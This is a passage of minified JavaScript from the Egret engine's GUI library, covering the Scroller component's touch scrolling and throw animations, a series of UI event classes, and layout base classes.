				this.touchBeginTimer.stop();
				a = this.delayTouchBeginEvent;
				this.delayTouchBeginEvent =
					null;
				this.dispatchPropagationEvent(a)
			};
			a.prototype.checkScrollPolicy = function () {
				var a = this._viewport,
				c;
				switch (this._horizontalScrollPolicy) {
				case "auto":
					c = a.contentWidth > a.width ? !0 : !1;
					break;
				case "on":
					c = !0;
					break;
				case "off":
					c = !1
				}
				this._horizontalCanScroll = c;
				var d;
				switch (this._verticalScrollPolicy) {
				case "auto":
					d = a.contentHeight > a.height ? !0 : !1;
					break;
				case "on":
					d = !0;
					break;
				case "off":
					d = !1
				}
				this._verticalCanScroll = d;
				return c || d
			};
			a.prototype.onTouchBegin = function (a) {
				if (!a.isDefaultPrevented() && this.checkScrollPolicy()) {
					this.verticalAnimator &&
					this.verticalAnimator.isPlaying && this.verticalAnimator.stop();
					this.horizontalAnimator && this.horizontalAnimator.isPlaying && this.horizontalAnimator.stop();
					var c = this._viewport,
					f = c.horizontalScrollPosition,
					c = c.verticalScrollPosition;
					this._offsetPointX = f + a.stageX;
					this._offsetPointY = c + a.stageY;
					this._velocityY = this._velocityX = 0;
					this._previousVelocityX.length = 0;
					this._previousVelocityY.length = 0;
					this._previousTouchTime = d.getTimer();
					this._previousTouchX = this._startTouchX = this._currentTouchX = a.stageX;
					this._previousTouchY =
						this._startTouchY = this._currentTouchY = a.stageY;
					this._startHorizontalScrollPosition = f;
					this._startVerticalScrollPosition = c;
					e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_MOVE, this.onTouchMove, this);
					e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.onTouchEnd, this);
					e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.onTouchEnd, this);
					this.addEventListener(d.Event.ENTER_FRAME, this.enterFrameHandler, this);
					a.preventDefault()
				}
			};
			a.prototype.onTouchMove = function (a) {
				this._currentTouchX =
					a.stageX;
				this._currentTouchY = a.stageY;
				this.delayTouchBeginEvent && (this.delayTouchBeginEvent = null, this.touchBeginTimer.stop());
				var c = this._viewport;
				if (this._horizontalCanScroll) {
					var d = this._offsetPointX - a.stageX;
					0 > d && (d *= 0.5);
					d > c.contentWidth - c.width && (d = 0.5 * (d + c.contentWidth - c.width));
					c.horizontalScrollPosition = d
				}
				this._verticalCanScroll && (a = this._offsetPointY - a.stageY, 0 > a && (a *= 0.5), a > c.contentHeight - c.height && (a = 0.5 * (a + c.contentHeight - c.height)), c.verticalScrollPosition = a)
			};
			a.prototype.onTouchEnd =
			function (a) {
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_MOVE, this.onTouchMove, this);
				e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.onTouchEnd, this);
				e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.onTouchEnd, this);
				this.removeEventListener(d.Event.ENTER_FRAME, this.enterFrameHandler, this);
				this._horizontalCanScroll && this.checkHorizontalScrollPosition();
				this._verticalCanScroll && this.checkVerticalScrollPosition()
			};
			a.easeOut = function (a) {
				a -= 1;
				return a * a * a + 1
			};
			a.prototype.enterFrameHandler = function (a) {
				a = d.getTimer();
				var c = a - this._previousTouchTime;
				0 < c && (this._previousVelocityX[this._previousVelocityX.length] = this._velocityX, 4 < this._previousVelocityX.length && this._previousVelocityX.shift(), this._previousVelocityY[this._previousVelocityY.length] = this._velocityY, 4 < this._previousVelocityY.length && this._previousVelocityY.shift(), this._velocityX = (this._currentTouchX - this._previousTouchX) / c, this._velocityY = (this._currentTouchY - this._previousTouchY) / c, this._previousTouchTime =
						a, this._previousTouchX = this._currentTouchX, this._previousTouchY = this._currentTouchY);
				a = Math.abs(this._currentTouchX - this._startTouchX);
				c = Math.abs(this._currentTouchY - this._startTouchY);
				this._horizontalCanScroll && 0.04 <= a && (this._startTouchX = this._currentTouchX, this._startHorizontalScrollPosition = this._viewport.horizontalScrollPosition);
				this._verticalCanScroll && 0.04 <= c && (this._startTouchY = this._currentTouchY, this._startVerticalScrollPosition = this._viewport.verticalScrollPosition)
			};
			a.prototype.checkHorizontalScrollPosition =
			function () {
				for (var b = this._viewport, c = b.horizontalScrollPosition, b = b.contentWidth - b.width, b = Math.max(0, b), d = 2.33 * this._velocityX, e = this._previousVelocityX.length, f = 2.33, g = 0; g < e; g++)
					var l = a.VELOCITY_WEIGHTS[g], d = d + this._previousVelocityX.shift() * l, f = f + l;
				d /= f;
				0.02 >= Math.abs(d) ? this.finishScrollingHorizontally() : (c = this.getAnimationDatas(d, c, b), this.throwHorizontally(c[0], c[1]))
			};
			a.prototype.checkVerticalScrollPosition = function () {
				for (var b = this._viewport, c = b.verticalScrollPosition, b = b.contentHeight -
						b.height, d = 2.33 * this._velocityY, e = this._previousVelocityY.length, f = 2.33, g = 0; g < e; g++)
					var l = a.VELOCITY_WEIGHTS[g], d = d + this._previousVelocityY.shift() * l, f = f + l;
				d /= f;
				0.02 >= Math.abs(d) ? this.finishScrollingVertically() : (c = this.getAnimationDatas(d, c, b), this.throwVertically(c[0], c[1]))
			};
			a.prototype.getAnimationDatas = function (b, c, d) {
				var e = Math.abs(b),
				f = 0,
				g = c + (b - 0.02) / Math.log(0.998);
				if (0 > g || g > d)
					for (g = c; 0.02 < Math.abs(b); )
						g -= b, b = 0 > g || g > d ? 0.998 * b * 0.95 : 0.998 * b, f++;
				else
					f = Math.log(0.02 / e) / Math.log(0.998);
				a.animationData ||
				(a.animationData = [0, 0]);
				b = a.animationData;
				b[0] = g;
				b[1] = f;
				return b
			};
			a.prototype.finishScrollingHorizontally = function (a) {
				var c = this._viewport;
				a = c.horizontalScrollPosition;
				var c = c.contentWidth - c.width,
				d = a;
				0 > a && (d = 0);
				a > c && (d = c);
				this.throwHorizontally(d, 300)
			};
			a.prototype.throwHorizontally = function (b, c) {
				"undefined" === typeof c && (c = 500);
				var d = this._viewport.horizontalScrollPosition;
				d != b && (this.horizontalAnimator || (this.horizontalAnimator = new e.Animation(this.horizontalUpdateHandler, this), this.horizontalAnimator.endFunction =
							this.finishScrollingHorizontally, this.horizontalAnimator.easerFunction = a.easeOut), this.horizontalAnimator.isPlaying && this.horizontalAnimator.stop(), this.horizontalAnimator.duration = c, this.horizontalAnimator.motionPaths = [{
							prop : "hsp",
							from : d,
							to : b
						}
					], this.horizontalAnimator.play())
			};
			a.prototype.horizontalUpdateHandler = function (a) {
				this._viewport.horizontalScrollPosition = a.currentValue.hsp
			};
			a.prototype.finishScrollingVertically = function (a) {
				var c = this._viewport;
				a = c.verticalScrollPosition;
				var c = c.contentHeight -
					c.height,
				c = Math.max(0, c),
				d = a;
				0 > a && (d = 0);
				a > c && (d = c);
				this.throwVertically(d, 300)
			};
			a.prototype.throwVertically = function (b, c) {
				"undefined" === typeof c && (c = 500);
				var d = this._viewport.verticalScrollPosition;
				d != b && (this.verticalAnimator || (this.verticalAnimator = new e.Animation(this.verticalUpdateHandler, this), this.verticalAnimator.endFunction = this.finishScrollingVertically, this.verticalAnimator.easerFunction = a.easeOut), this.verticalAnimator.isPlaying && this.verticalAnimator.stop(), this.verticalAnimator.duration =
						c, this.verticalAnimator.motionPaths = [{
							prop : "vsp",
							from : d,
							to : b
						}
					], this.verticalAnimator.play())
			};
			a.prototype.verticalUpdateHandler = function (a) {
				this._viewport.verticalScrollPosition = a.currentValue.vsp
			};
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return this.viewport ? 1 : 0
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.throwRangeError = function (a) {
				throw new RangeError('\u7d22\u5f15:"' + a + '"\u8d85\u51fa\u53ef\u89c6\u5143\u7d20\u7d22\u5f15\u8303\u56f4');
			};
			a.prototype.getElementAt = function (a) {
				if (this.viewport &&
					0 == a)
					return this.viewport;
				this.throwRangeError(a);
				return null
			};
			a.prototype.getElementIndex = function (a) {
				return null != a && a == this.viewport ? 0 : -1
			};
			a.prototype.containsElement = function (a) {
				return null != a && a == this.viewport ? !0 : !1
			};
			a.prototype.throwNotSupportedError = function () {
				throw Error("\u6b64\u65b9\u6cd5\u5728Scroller\u7ec4\u4ef6\u5185\u4e0d\u53ef\u7528!");
			};
			a.prototype.addElement = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.addElementAt = function (a, c) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.removeElement = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.removeElementAt = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.removeAllElements = function () {
				this.throwNotSupportedError()
			};
			a.prototype.setElementIndex = function (a, c) {
				this.throwNotSupportedError()
			};
			a.prototype.swapElements = function (a, c) {
				this.throwNotSupportedError()
			};
			a.prototype.swapElementsAt = function (a, c) {
				this.throwNotSupportedError()
			};
			a.prototype.addChild = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.addChildAt = function (a, c) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.removeChild = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.removeChildAt = function (a) {
				this.throwNotSupportedError();
				return null
			};
			a.prototype.setChildIndex = function (a, c) {
				this.throwNotSupportedError()
			};
			a.prototype.swapChildren = function (a, c) {
				this.throwNotSupportedError()
			};
			a.prototype.swapChildrenAt = function (a, c) {
				this.throwNotSupportedError()
			};
			a.VELOCITY_WEIGHTS = [1, 1.33, 1.66, 2];
			return a
		}
		(e.UIComponent);
		e.Scroller = f;
		f.prototype.__class__ = "egret.gui.Scroller"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				c.call(this, a, d, e)
			}
			__extends(a, c);
			a.dispatchUIEvent = function (b, c) {
				d.Event._dispatchByTarget(a, b, c)
			};
			a.INITIALIZE = "initialize";
			a.CREATION_COMPLETE = "creationComplete";
			a.UPDATE_COMPLETE = "updateComplete";
			a.BUTTON_DOWN = "buttonDown";
			a.CHANGE_END = "changeEnd";
			a.CHANGE_START = "changeStart";
			a.CHANGING = "changing";
			a.VALUE_COMMIT = "valueCommit";
			a.SKIN_CHANGED = "skinChanged";
			a.CONTENT_CHANGED =
				"contentChanged";
			a.OPEN = "open";
			a.CLOSE = "close";
			a.PLAY_COMPLETE = "playComplete";
			return a
		}
		(d.Event);
		e.UIEvent = f;
		f.prototype.__class__ = "egret.gui.UIEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h, g, l, k) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = null);
				"undefined" === typeof g && (g = null);
				"undefined" === typeof l && (l = null);
				"undefined" === typeof k && (k = null);
				c.call(this, a, d, e);
				this.kind = f;
				this.property = h;
				this.oldValue = g;
				this.newValue = l;
				this.source = k
			}
			__extends(a, c);
			a.dispatchPropertyChangeEvent = function (b, c, e, f, h, g) {
				"undefined" === typeof c && (c = null);
				"undefined" ===
				typeof e && (e = null);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = null);
				"undefined" === typeof g && (g = null);
				var l = d.Event._getPropertyData(a);
				l.kind = c;
				l.property = e;
				l.oldValue = f;
				l.newValue = h;
				l.source = g;
				d.Event._dispatchByTarget(a, b, a.PROPERTY_CHANGE, l)
			};
			a.PROPERTY_CHANGE = "propertyChange";
			return a
		}
		(d.Event);
		e.PropertyChangeEvent = f;
		f.prototype.__class__ = "egret.gui.PropertyChangeEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.UPDATE = "update";
			c.DELETE = "delete";
			return c
		}
		();
		d.PropertyChangeEventKind = f;
		f.prototype.__class__ = "egret.gui.PropertyChangeEventKind"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = NaN);
				"undefined" === typeof e && (e = NaN);
				"undefined" === typeof f && (f = !1);
				"undefined" === typeof h && (h = !1);
				c.call(this, a, f, h);
				this.oldX = d;
				this.oldY = e
			}
			__extends(a, c);
			a.dispatchMoveEvent = function (b, c, e) {
				"undefined" === typeof c && (c = NaN);
				"undefined" === typeof e && (e = NaN);
				var f = d.Event._getPropertyData(a);
				f.oldX = c;
				f.oldY = e;
				d.Event._dispatchByTarget(a, b, a.MOVE, f)
			};
			a.MOVE = "move";
			return a
		}
		(d.Event);
		e.MoveEvent = f;
		f.prototype.__class__ =
			"egret.gui.MoveEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = NaN);
				"undefined" === typeof e && (e = NaN);
				"undefined" === typeof f && (f = !1);
				"undefined" === typeof h && (h = !1);
				c.call(this, a, f, h);
				this.oldWidth = d;
				this.oldHeight = e
			}
			__extends(a, c);
			a.dispatchResizeEvent = function (b, c, e) {
				"undefined" === typeof c && (c = NaN);
				"undefined" === typeof e && (e = NaN);
				var f = d.Event._getPropertyData(a);
				f.oldWidth = c;
				f.oldHeight = e;
				d.Event._dispatchByTarget(a, b, a.RESIZE, f)
			};
			a.RESIZE = "resize";
			return a
		}
		(d.Event);
		e.ResizeEvent = f;
		f.prototype.__class__ = "egret.gui.ResizeEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = null);
				c.call(this, a, d, e);
				this.partName = f;
				this.instance = h
			}
			__extends(a, c);
			a.dispatchSkinPartEvent = function (b, c, e, f) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = null);
				var h = d.Event._getPropertyData(a);
				h.partName = e;
				h.instance = f;
				d.Event._dispatchByTarget(a, b, c, h)
			};
			a.PART_ADDED = "partAdded";
			a.PART_REMOVED =
				"partRemoved";
			return a
		}
		(d.Event);
		e.SkinPartEvent = f;
		f.prototype.__class__ = "egret.gui.SkinPartEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = -1);
				c.call(this, a, d, e);
				this.detail = f
			}
			__extends(a, c);
			a.dispatchCloseEvent = function (b, c, e) {
				"undefined" === typeof e && (e = -1);
				var f = d.Event._getPropertyData(a);
				f.detail = e;
				d.Event._dispatchByTarget(a, b, c, f)
			};
			a.CLOSE = "close";
			return a
		}
		(d.Event);
		e.CloseEvent = f;
		f.prototype.__class__ = "egret.gui.CloseEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h, g, l, k) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = -1);
				"undefined" === typeof g && (g = -1);
				"undefined" === typeof l && (l = null);
				"undefined" === typeof k && (k = null);
				c.call(this, a, d, e);
				this.kind = f;
				this.location = h;
				this.oldLocation = g;
				this.items = l ? l : [];
				this.oldItems = k ? k : []
			}
			__extends(a, c);
			a.dispatchCollectionEvent = function (b, c, e, f, h, g, l) {
				"undefined" === typeof e && (e = null);
				"undefined" ===
				typeof f && (f = -1);
				"undefined" === typeof h && (h = -1);
				"undefined" === typeof g && (g = null);
				"undefined" === typeof l && (l = null);
				var k = d.Event._getPropertyData(a);
				k.kind = e;
				k.location = f;
				k.oldLocation = h;
				k.items = g;
				k.oldItems = l;
				d.Event._dispatchByTarget(a, b, c, k)
			};
			a.COLLECTION_CHANGE = "collectionChange";
			return a
		}
		(d.Event);
		e.CollectionEvent = f;
		f.prototype.__class__ = "egret.gui.CollectionEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.ADD = "add";
			c.MOVE = "move";
			c.REFRESH = "refresh";
			c.REMOVE = "remove";
			c.REPLACE = "replace";
			c.RESET = "reset";
			c.UPDATE = "update";
			c.OPEN = "open";
			c.CLOSE = "close";
			return c
		}
		();
		d.CollectionEventKind = f;
		f.prototype.__class__ = "egret.gui.CollectionEventKind"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = -1);
				c.call(this, a, d, e);
				this.element = f;
				this.index = h
			}
			__extends(a, c);
			a.dispatchElementExistenceEvent = function (b, c, e, f) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = -1);
				var h = d.Event._getPropertyData(a);
				h.element = e;
				h.index = f;
				d.Event._dispatchByTarget(a, b, c, h)
			};
			a.ELEMENT_ADD = "elementAdd";
			a.ELEMENT_REMOVE =
				"elementRemove";
			return a
		}
		(d.Event);
		e.ElementExistenceEvent = f;
		f.prototype.__class__ = "egret.gui.ElementExistenceEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = -1);
				"undefined" === typeof h && (h = -1);
				c.call(this, a, d, e);
				this.oldIndex = f;
				this.newIndex = h
			}
			__extends(a, c);
			a.dispatchIndexChangeEvent = function (b, c, e, f, h) {
				"undefined" === typeof e && (e = -1);
				"undefined" === typeof f && (f = -1);
				"undefined" === typeof h && (h = !1);
				var g = d.Event._getPropertyData(a);
				g.oldIndex = e;
				g.newIndex = f;
				return d.Event._dispatchByTarget(a, b, c, g, !1, h)
			};
			a.CHANGE = "change";
			a.CHANGING = "changing";
			return a
		}
		(d.Event);
		e.IndexChangeEvent = f;
		f.prototype.__class__ = "egret.gui.IndexChangeEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h, g, l, k, n, q, p, r, x) {
				"undefined" === typeof d && (d = !0);
				"undefined" === typeof e && (e = !0);
				"undefined" === typeof f && (f = 0);
				"undefined" === typeof h && (h = 0);
				"undefined" === typeof g && (g = 0);
				"undefined" === typeof l && (l = !1);
				"undefined" === typeof k && (k = !1);
				"undefined" === typeof n && (n = !1);
				"undefined" === typeof q && (q = !1);
				"undefined" === typeof p && (p = -1);
				"undefined" === typeof r && (r = null);
				"undefined" === typeof x && (x = null);
				c.call(this, a, d, e, f, h, g, l, k, n, q);
				this.itemIndex =
					p;
				this.item = r;
				this.itemRenderer = x
			}
			__extends(a, c);
			a.dispatchListEvent = function (b, c, e, f, h, g) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = -1);
				"undefined" === typeof h && (h = null);
				"undefined" === typeof g && (g = null);
				var l = d.Event._getPropertyData(a);
				l.touchPointID = e.touchPointID;
				l._stageX = e.stageX;
				l._stageY = e.stageY;
				l.ctrlKey = e.ctrlKey;
				l.altKey = e.altKey;
				l.shiftKey = e.shiftKey;
				l.touchDown = e.touchDown;
				l.itemIndex = f;
				l.item = h;
				l.itemRenderer = g;
				d.Event._dispatchByTarget(a, b, c, l)
			};
			a.ITEM_ROLL_OUT = "itemRollOut";
			a.ITEM_ROLL_OVER = "itemRollOver";
			a.ITEM_CLICK = "itemClick";
			return a
		}
		(d.TouchEvent);
		e.ListEvent = f;
		f.prototype.__class__ = "egret.gui.ListEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = !1);
				c.call(this, a, d, e);
				this.popUp = f;
				this.modal = h
			}
			__extends(a, c);
			a.dispatchPopUpEvent = function (b, c, e, f) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = !1);
				var h = d.Event._getPropertyData(a);
				h.popUp = e;
				h.modal = f;
				d.Event._dispatchByTarget(a, b, c, h)
			};
			a.ADD_POPUP = "addPopUp";
			a.REMOVE_POPUP = "removePopUp";
			a.BRING_TO_FRONT =
				"bringToFront";
			return a
		}
		(d.Event);
		e.PopUpEvent = f;
		f.prototype.__class__ = "egret.gui.PopUpEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h, g) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = -1);
				"undefined" === typeof g && (g = null);
				c.call(this, a, d, e);
				this.renderer = f;
				this.index = h;
				this.data = g
			}
			__extends(a, c);
			a.dispatchRendererExistenceEvent = function (b, c, e, f, h) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = -1);
				"undefined" === typeof h && (h = null);
				var g = d.Event._getPropertyData(a);
				g.renderer = e;
				g.index =
					f;
				g.data = h;
				d.Event._dispatchByTarget(a, b, c, g)
			};
			a.RENDERER_ADD = "rendererAdd";
			a.RENDERER_REMOVE = "rendererRemove";
			return a
		}
		(d.Event);
		e.RendererExistenceEvent = f;
		f.prototype.__class__ = "egret.gui.RendererExistenceEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = null);
				c.call(this, a, d, e);
				this.oldState = f;
				this.newState = h
			}
			__extends(a, c);
			a.dispatchStateChangeEvent = function (b, c, e, f) {
				"undefined" === typeof e && (e = null);
				"undefined" === typeof f && (f = null);
				var h = d.Event._getPropertyData(a);
				h.oldState = e;
				h.newState = f;
				d.Event._dispatchByTarget(a, b, c, h)
			};
			a.CURRENT_STATE_CHANGE = "currentStateChange";
			a.CURRENT_STATE_CHANGING = "currentStateChanging";
			return a
		}
		(d.Event);
		e.StateChangeEvent = f;
		f.prototype.__class__ = "egret.gui.StateChangeEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !1);
				c.call(this, a, d, e)
			}
			__extends(a, c);
			a.dispatchTrackBaseEvent = function (b, c) {
				d.Event._dispatchByTarget(a, b, c)
			};
			a.THUMB_DRAG = "thumbDrag";
			a.THUMB_PRESS = "thumbPress";
			a.THUMB_RELEASE = "thumbRelease";
			return a
		}
		(d.Event);
		e.TrackBaseEvent = f;
		f.prototype.__class__ = "egret.gui.TrackBaseEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a(a, d, e, f, h, g) {
				"undefined" === typeof d && (d = !1);
				"undefined" === typeof e && (e = !0);
				"undefined" === typeof f && (f = -1);
				"undefined" === typeof h && (h = null);
				"undefined" === typeof g && (g = null);
				c.call(this, a, d, e);
				this.item = h;
				this.itemRenderer = g;
				this.itemIndex = f
			}
			__extends(a, c);
			a.dispatchTreeEvent = function (b, c, e, f, h, g) {
				"undefined" === typeof e && (e = -1);
				"undefined" === typeof f && (f = null);
				"undefined" === typeof h && (h = null);
				"undefined" === typeof g && (g = !1);
				var l = d.Event._getPropertyData(a);
				l.itemIndex = e;
				l.item = f;
				l.itemRenderer = h;
				l.opening = g;
				d.Event._dispatchByTarget(a, b, c, l)
			};
			a.ITEM_CLOSE = "itemClose";
			a.ITEM_OPEN = "itemOpen";
			a.ITEM_OPENING = "itemOpening";
			return a
		}
		(d.Event);
		e.TreeEvent = f;
		f.prototype.__class__ = "egret.gui.TreeEvent"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._useVirtualLayout = !1
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "target", {
				get : function () {
					return this._target
				},
				set : function (a) {
					this._target != a && (this._target = a, this.clearVirtualLayoutCache())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "useVirtualLayout", {
				get : function () {
					return this._useVirtualLayout
				},
				set : function (a) {
					this._useVirtualLayout != a && (this._useVirtualLayout = a, this.dispatchEventWith("useVirtualLayoutChanged"),
						this._useVirtualLayout && !a && this.clearVirtualLayoutCache(), this.target && this.target.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "typicalLayoutRect", {
				get : function () {
					return this._typicalLayoutRect
				},
				set : function (a) {
					this._typicalLayoutRect != a && (this._typicalLayoutRect = a, this.target && this.target.invalidateSize())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.scrollPositionChanged = function () {};
			a.prototype.clearVirtualLayoutCache = function () {};
			a.prototype.elementAdded =
			function (a) {};
			a.prototype.elementRemoved = function (a) {};
			a.prototype.measure = function () {};
			a.prototype.updateDisplayList = function (a, c) {};
			return a
		}
		(d.EventDispatcher);
		e.LayoutBase = f;
		f.prototype.__class__ = "egret.gui.LayoutBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._mouseWheelSpeed = 20
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "useVirtualLayout", {
				set : function (a) {},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "mouseWheelSpeed", {
				get : function () {
					return this._mouseWheelSpeed
				},
				set : function (a) {
					0 == a && (a = 1);
					this._mouseWheelSpeed = a
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getElementBoundsLeftOfScrollRect = function (a) {
